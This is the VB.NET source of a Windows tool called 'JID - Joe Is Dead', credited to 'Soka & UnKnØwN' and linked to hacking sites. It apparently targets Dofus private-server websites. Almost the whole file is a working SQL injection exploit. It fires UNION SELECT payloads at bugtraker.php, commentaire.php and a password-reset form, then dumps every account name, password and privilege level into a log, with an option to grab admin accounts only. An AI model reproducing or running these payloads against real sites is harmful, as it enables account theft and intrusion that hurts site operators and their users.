Public Class Main
    Dim surl As String
    Dim limitf As Integer = 0
    Dim limitl As Integer = 1
    Dim info As String = ""
    Dim accCount As String = ""
    Dim Thread As Threading.Thread = New Threading.Thread(AddressOf StartExploit)
    Sub append(ByVal Type As String, Optional ByVal Text As String = " ")
        Select Case Type.ToLower
            Case "info"
                LogsWriter.Info(Text)
            Case "note"
                LogsWriter.Note(Text)
            Case "error"
                LogsWriter.Erreur(Text)
        End Select
    End Sub
    Function ExploitBugTracker() As Boolean
        limitf = 0
        Dim request As String = ""
        Dim tx As String = ""
        If RecupAdminOnly.Checked Then
            request = "where level>0"
            tx = "Admin accounts number :"
        Else
            request = ""
            tx = "Accounts number :"
        End If
        Dim WC As New System.Net.WebClient
        append("note", "Testing vulnerability...")
        Try
            If WC.DownloadString(surl & "/bugtraker.php?ticket='1").Contains("You have an error in your SQL syntax;") Then
                append("info", "Target vulnerable")
                Dim text() As String = WC.DownloadString(surl & "/bugtraker.php?ticket='UNION SELECT 1,2,3,4,5,concat(CHAR(126),@@version,CHAR(126)),7 AND '1'<>'2").Split("~")
                append("note", "MySQL Version : " & text(1))
                Dim text2() As String = WC.DownloadString(surl & "/bugtraker.php?ticket='UNION SELECT 1,2,3,4,5,concat(CHAR(126),database(),CHAR(126)),7 AND '1'<>'2").Split("~")
                append("note", "Current Database : " & text2(1))
                Dim d() As String = WC.DownloadString(surl & "/bugtraker.php?ticket='UNION SELECT 1,2,3,4,5,(select concat(CHAR(126),COUNT(*),CHAR(126)) FROM accounts " & request & "),7 AND '1'<>'2").Split("~")
                accCount = d(1)
                append("note", tx & d(1))
                For i As Integer = 1 To accCount
                    Dim Data() As String = WC.DownloadString(surl & "/bugtraker.php?ticket='UNION SELECT 1,2,3,4,5,(select concat(CHAR(126),account,CHAR(94),pass,CHAR(94),level,CHAR(126)) FROM accounts " & request & " order by level desc limit " & limitf & ",1),7 AND '1'<>'2").Split("~")
                    If Not Data(1) = "" Then
                        Dim infos() As String = Data(1).Split("^")
                        append("info", "*************************************************************************************")
                        append("info", "Compte : " & infos(0) & " | Pass " & infos(1) & " | Level " & infos(2))
                        limitf += 1
                    End If
                Next
                Return True
            Else
                Return False
                Exit Function
            End If
        Catch ex As Exception
            append("error", ex.Message)
            Return False
            Exit Function
        End Try
       Return True
    End Function
    Function ExploitCommentaires() As Boolean
        Dim request As String = ""
        Dim tx As String = ""
        If RecupAdminOnly.Checked Then
            request = "where level>0"
            tx = "Admin accounts number :"
        Else
            request = ""
            tx = "Accounts number :"
        End If
        limitf = 0
        append("note", "Testing vulnerability...")
        Dim WC As New System.Net.WebClient
        Try
            If WC.DownloadString(surl & "/commentaire.php?news='1").Contains("You have an error in your SQL syntax;") Then
                append("info", "Target vulnerable")
                Dim text() As String = WC.DownloadString(surl & "/commentaire.php?news='UNION ALL SELECT concat(CHAR(124),@@version,CHAR(124)),2,3,4,5 AND '1'<>'2").Split("|")
                append("note", "MySQL Version : " & text(1))
                Dim text2() As String = WC.DownloadString(surl & "/bugtraker.php?ticket='UNION SELECT 1,2,3,4,5,concat(CHAR(126),database(),CHAR(126)),7 AND '1'<>'2").Split("~")
                append("note", "Current Database : " & text2(1))
                Dim d() As String = WC.DownloadString(surl & "/commentaire.php?news='UNION ALL SELECT (select concat(CHAR(124),COUNT(*),CHAR(124)) FROM accounts " & request & " order by level desc),2,3,4,5 AND '1'<>'2").Split("|")
                accCount = d(1)
                append("note", tx & d(1))
                For i As Integer = 1 To accCount
                    Dim Data() As String = WC.DownloadString(surl & "/commentaire.php?news='UNION ALL SELECT (SELECT concat(CHAR(124),concat(account,CHAR(94),pass,CHAR(94),level),CHAR(124)) FROM accounts " & request & " order by level desc limit " & limitf & ",1),2,3,4,5 AND '1'<>'2").Split("|")
                    If Not Data(1) = "" Then
                        Dim infos() As String = Data(1).Split("^")
                        append("info", "*************************************************************************************")
                        append("info", "Compte : " & infos(0) & " | Pass " & infos(1) & " | Level " & infos(2))
                        limitf += 1
                    End If
                Next
                Return True
            Else
                Return False
                Exit Function
            End If
        Catch ex As Exception
            append("error", ex.Message)
            Return False
            Exit Function
        End Try
        Return True
    End Function
    Function ExploitPOSTmdp27() As Boolean
        Dim request As String = ""
        Dim tx As String = ""
        If RecupAdminOnly.Checked Then
            request = "where level>0"
            tx = "Admin accounts number :"
        Else
            request = ""
            tx = "Accounts number :"
        End If
        limitf = 0
        append("note", "Testing vulnerability...")
        Try
            If PostIt.DataPost("ndc=test""", surl & "/mdpoublie.php?etape=2", True) Then
                append("info", "target vunlerable")
            Else
                Return False
                Exit Function
            End If
            Dim text() As String = PostIt.DataPost("ndc=test""UNION SELECT 1,2,3,4,5,6,7,8,(concat(CHAR(124),@@version,CHAR(124))),10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27 and ""1""<>""2", surl & "/mdpoublie.php?etape=2").Split("|")
            append("note", "MySQL Version : " & text(1))
            Dim database() As String = PostIt.DataPost("ndc=test""UNION SELECT 1,2,3,4,5,6,7,8,(concat(CHAR(124),database(),CHAR(124))),10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27 and ""1""<>""2", surl & "/mdpoublie.php?etape=2").Split("|")
            append("note", "Current Database : " & database(1))
            Dim Number() As String = PostIt.DataPost("ndc=test""UNION SELECT 1,2,3,4,5,6,7,8,(SELECT concat(CHAR(124),COUNT(*),CHAR(124)) FROM accounts " & request & "),10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27 and ""1""<>""2", surl & "/mdpoublie.php?etape=2").Split("|")
            append("note", tx & Number(1))
            Dim n As Integer = Number(1)
            For i As Integer = 1 To n
                Dim data() As String = PostIt.DataPost("ndc=test""UNION SELECT 1,2,3,4,5,6,7,8,(SELECT concat(CHAR(124),account,0x5e,pass,0x5e,level,0x5e,CHAR(124)) FROM accounts " & request & " order by level desc limit " & limitf & ",1),10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27 and ""1""<>""2", surl & "/mdpoublie.php?etape=2").Split("|")
                Dim infos() As String = data(1).Split("^")
                append("info", "*************************************************************************************")
                append("info", "Compte : " & infos(0) & " | Pass " & infos(1) & " | Level " & infos(2))
                limitf += 1
            Next
        Catch ex As Exception
            Return False
            Exit Function
        End Try
        Return True
    End Function
    Function ExploitPOSTmdp28() As Boolean
        Dim request As String = ""
        Dim tx As String = ""
        If RecupAdminOnly.Checked Then
            request = "where level>0"
            tx = "Admin accounts number :"
        Else
            request = ""
            tx = "Accounts number :"
        End If
        limitf = 0
        append("note", "Testing vulnerability...")
        Try
            If PostIt.DataPost("ndc=test""", surl & "/mdpoublie.php?etape=2", True) Then
                append("info", "target vunlerable")
            Else
                Return False
                Exit Function
            End If
            Dim text() As String = PostIt.DataPost("ndc=test""UNION SELECT 1,2,3,4,5,6,7,8,(concat(CHAR(124),@@version,CHAR(124))),10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28 and ""1""<>""2", surl & "/mdpoublie.php?etape=2").Split("|")
            append("note", "MySQL Version : " & text(1))
            Dim database() As String = PostIt.DataPost("ndc=test""UNION SELECT 1,2,3,4,5,6,7,8,(concat(CHAR(124),database(),CHAR(124))),10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28 and ""1""<>""2", surl & "/mdpoublie.php?etape=2").Split("|")
            append("note", "Current Database : " & database(1))
            Dim Number() As String = PostIt.DataPost("ndc=test""UNION SELECT 1,2,3,4,5,6,7,8,(SELECT concat(CHAR(124),COUNT(*),CHAR(124)) FROM accounts " & request & "),10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28 and ""1""<>""2", surl & "/mdpoublie.php?etape=2").Split("|")
            append("note", tx & Number(1))
            Dim n As Integer = Number(1)
            For i As Integer = 1 To n
                Dim data() As String = PostIt.DataPost("ndc=test""UNION SELECT 1,2,3,4,5,6,7,8,(SELECT concat(CHAR(124),account,0x5e,pass,0x5e,level,0x5e,CHAR(124)) FROM accounts " & request & " order by level desc limit " & limitf & ",1),10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28 and ""1""<>""2", surl & "/mdpoublie.php?etape=2").Split("|")
                Dim infos() As String = data(1).Split("^")
                append("info", "*************************************************************************************")
                append("info", "Compte : " & infos(0) & " | Pass " & infos(1) & " | Level " & infos(2))
                limitf += 1
            Next
        Catch ex As Exception
            Return False
            Exit Function
        End Try
        Return True
    End Function
    Sub StartExploit()
        append("note", "Starting Injection ...")
        If ExploitCommentaires() Then
            Exit Sub
        End If
        append("note", "Changing infiltration method")
        If ExploitBugTracker() Then
            Exit Sub
        End If
        append("note", "Changing infiltration method")
        If ExploitPOSTmdp27() Then
            Exit Sub
        End If
        append("note", "Changing infiltration method")
        If ExploitPOSTmdp28() Then
            Exit Sub
        End If
        append("error", "Target not vulnerable")
    End Sub
    Private Sub PictureBox2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles PictureBox2.Click
        If SiteUrl.Text = "" Then
            MsgBox("The URL is not valid")
            append("error", "The URL is not valid")
            Exit Sub
        End If
        surl = SiteUrl.Text
        Thread = New Threading.Thread(AddressOf StartExploit)
        Thread.IsBackground = True
        Thread.Start()
        tStop.Show()
    End Sub
    Private Sub Main_Load(ByVal sender As Object, ByVal e As System.EventArgs) Handles Me.Load
        LogsWriter.M = Me
        append("info", "JID - Joe Is Dead v : " & My.Application.Info.Version.ToString & " By Soka & UnKnØwN")
        append("info", "http://www.izzi-hack.com")
        append("info", "http://www.dofus-exploit.com")
        append("info", "*************************************************************************************")
    End Sub
    Private Sub GButton1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles GButton1.Click
        End
    End Sub
    Private Sub GButton3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles GButton3.Click
        Logs.Clear()
        append("info", "JID - Joe Is Dead v : " & My.Application.Info.Version.ToString & " By Soka & UnKnØwN")
        append("info", "http://www.izzi-hack.com")
        append("info", "http://www.dofus-exploit.com")
        append("info", "*************************************************************************************")
    End Sub
    Private Sub GButton2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles GButton2.Click
        Writer.Write(Logs.Text)
    End Sub
    Private Sub PictureBox3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles PictureBox3.Click
        Shell("osk")
    End Sub
    Private Sub tStop_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles tStop.Click
        Thread.Abort()
        tStop.Hide()
        append("error", "Injection canceled by user")
    End Sub
End Class
